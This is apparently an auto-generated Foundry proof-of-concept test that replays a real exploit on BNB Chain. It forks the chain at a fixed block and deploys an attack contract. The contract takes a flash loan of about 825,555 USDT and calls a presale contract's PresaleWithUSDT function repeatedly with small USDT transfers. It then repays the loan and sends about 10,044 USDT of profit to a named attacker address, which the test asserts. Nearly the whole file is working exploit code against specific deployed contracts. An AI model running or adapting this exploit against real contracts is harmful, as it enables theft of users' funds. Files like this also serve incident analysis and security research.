
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 44348366;
    uint256 constant TX_TIMESTAMP = 1732625873;
    uint256 constant TX_BLOCK_NUMBER = 44348367;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttackContrac();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        _executeAttack(attack);
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttackContrac() internal returns (OurAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _installRuntimeFallb();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _expectedAttackChild(OurAttack attack) internal view returns (address) {
        attack;
        return address(0);
    }

    function _executeAttack(OurAttack attack) internal {
        attack.attack{value: TX_VALUE}();
    }

    function _installRuntimeFallb() internal {

        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.USDT, "USDT", 10044490614704315622688);
    }
}

contract OurAttack {
    function attack() external payable {
        _runExploitPath();
    }

    function _runExploitPath() internal {
        IERC20Like(Addresses.USDT).approve(Addresses.A_5FBBB3_042E, type(uint256).max);
        {
            bytes memory flashLoanProof = hex"3078";
            IContract_6098A5_B476(Addresses.A_6098A5_B476)
                .flashLoan(0, 825555500000000000000, address(this), flashLoanProof);
        }
    }

    function flashCallback() internal {
        _replayDone[REPLAY_CALLBACK_2] = true;
        flashCallback2();
        flashCallback3();
        flashCallback4();
        flashCallback5();
        flashCallback6();
        flashCallback7();
        flashCallback8();
        flashCallback9();
        flashCallback10();
        flashCallback11();
        flashCallback12();
        flashCallback13();
        flashCallback14();
        flashCallback15();
    }

    function flashCallback2() internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.A_5FBBB3_042E, 110000000000000);
        IContract_5FBBB3_042E(Addresses.A_5FBBB3_042E).PresaleWithUSDT(76500000000000000000, address(this));
    }

    function flashCallback3() internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.A_5FBBB3_042E, 120000000000000);
        IContract_5FBBB3_042E(Addresses.A_5FBBB3_042E).PresaleWithUSDT(76500000000000000000, address(this));
    }

    function flashCallback4() internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.A_5FBBB3_042E, 130000000000000);
    }

    function flashCallback5() internal {
        IContract_5FBBB3_042E(Addresses.A_5FBBB3_042E).PresaleWithUSDT(76500000000000000000, address(this));
        IERC20Like(Addresses.USDT).transfer(Addresses.A_5FBBB3_042E, 140000000000000);
    }

    function flashCallback6() internal {
        IContract_5FBBB3_042E(Addresses.A_5FBBB3_042E).PresaleWithUSDT(76500000000000000000, address(this));
        IERC20Like(Addresses.USDT).transfer(Addresses.A_5FBBB3_042E, 150000000000000);
    }

    function flashCallback7() internal {
        IContract_5FBBB3_042E(Addresses.A_5FBBB3_042E).PresaleWithUSDT(76500000000000000000, address(this));
        IERC20Like(Addresses.USDT).transfer(Addresses.A_5FBBB3_042E, 160000000000000);
    }

    function flashCallback8() internal {
        IContract_5FBBB3_042E(Addresses.A_5FBBB3_042E).PresaleWithUSDT(76500000000000000000, address(this));
    }

    function flashCallback9() internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.A_5FBBB3_042E, 170000000000000);
        IContract_5FBBB3_042E(Addresses.A_5FBBB3_042E).PresaleWithUSDT(76500000000000000000, address(this));
    }

    function flashCallback10() internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.A_5FBBB3_042E, 180000000000000);
        IContract_5FBBB3_042E(Addresses.A_5FBBB3_042E).PresaleWithUSDT(76500000000000000000, address(this));
    }

    function flashCallback11() internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.A_5FBBB3_042E, 190000000000000);
        IContract_5FBBB3_042E(Addresses.A_5FBBB3_042E).PresaleWithUSDT(76500000000000000000, address(this));
    }

    function flashCallback12() internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.A_5FBBB3_042E, 200000000000000);
        IContract_5FBBB3_042E(Addresses.A_5FBBB3_042E).PresaleWithUSDT(76500000000000000000, address(this));
    }

    function flashCallback13() internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.A_5FBBB3_042E, 210000000000000);
        IContract_5FBBB3_042E(Addresses.A_5FBBB3_042E).PresaleWithUSDT(76500000000000000000, address(this));
    }

    function flashCallback14() internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.A_6098A5_B476, 825555500000000000000);
        IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function flashCallback15() internal {
        {
            uint256 transferActionGraphAmount = 10044490614704315622688;
            IERC20Like(Addresses.USDT).transfer(Addresses.attacker_eoa, transferActionGraphAmount);
        }
    }

    receive() external payable {}

    function transfer(address recipient) external payable {
        recipient;
        _runExploitPath();
        return;
    }

    function DPPFlashLoanCall(address arg0, uint256 amount, uint256 amount1, bytes calldata arg3) external payable {
        arg0;
        amount;
        amount1;
        arg3;
        if (!_replayDone[REPLAY_CALLBACK_2]) flashCallback();
        return;
    }

    fallback() external payable {
        _entryCb();
    }

    function _entryCb() internal {}

    bytes32 private constant REPLAY_CALLBACK_2 = keccak256("poc.replay.REPLAY_CALLBACK_2");
    mapping(bytes32 => bool) private _replayDone;

    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _tryHelperAt(address target, bytes memory data) internal {
        (bool ok,) = target.call(data);
        ok;
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant attacker_eoa = 0x5af00B07a55F55775e4d99249DC7d81F5bc14c22;
    address internal constant A_5FBBB3_042E = 0x5fbBb391d54f4FB1d1CF18310c93d400BC80042E;
    address internal constant A_6098A5_B476 = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
    address internal constant attack_contract = 0x6deF9e4a6bb9C3bfE0648A11D3FfF14447079e78;
    address internal constant A_A00AF1_B6D8 = 0xa00AF1fd5fa5AF8DA4b763dE673d22E5a13bB6d8;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant A_FAFAFA_FAFA = 0xFafafAfafAFaFAFaFafafafAfaFaFAfAfAfAFaFA;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface IContract_5FBBB3_042E {
    function PresaleWithUSDT(uint256, address) external returns (uint256);
}

interface IContract_6098A5_B476 {
    function flashLoan(uint256, uint256, address, bytes calldata) external;
}
